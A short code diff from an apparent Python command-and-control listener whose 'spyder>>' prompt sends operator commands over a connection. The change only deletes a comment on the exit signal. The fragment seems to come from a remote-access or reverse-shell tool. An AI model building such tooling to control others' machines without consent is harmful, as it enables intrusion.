@@ -46,7 +46,7 @@ class Listener:
 
             command = input("spyder>> ").split(" ")
             if command[0] == 'exit':
-                self.reliable_send('exit') #send the exit signal before 
+                self.reliable_send('exit')
                 time.sleep(2)
                 self.connection.close()
                 exit()
